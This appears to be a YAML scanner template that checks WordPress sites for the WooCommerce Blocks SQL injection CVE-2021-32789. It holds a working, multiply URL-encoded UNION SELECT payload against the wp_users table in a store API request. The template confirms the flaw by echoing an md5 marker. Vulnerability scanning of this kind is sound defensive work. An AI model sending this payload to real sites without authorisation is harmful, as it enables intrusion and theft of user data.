name: poc-yaml-wordpress-woocommerce-cve-2021-32789-sqli
manual: true
transport: http
set:
    rand: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252cmd5%252528{{rand}}%252529%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500
        expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(rand)), 2, 28)))
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/woocommerce/woocommerce-blocks/security/advisories/GHSA-6hq4-w6wv-8wrp
    vulnerability:
        id: CT-157369
        level: high
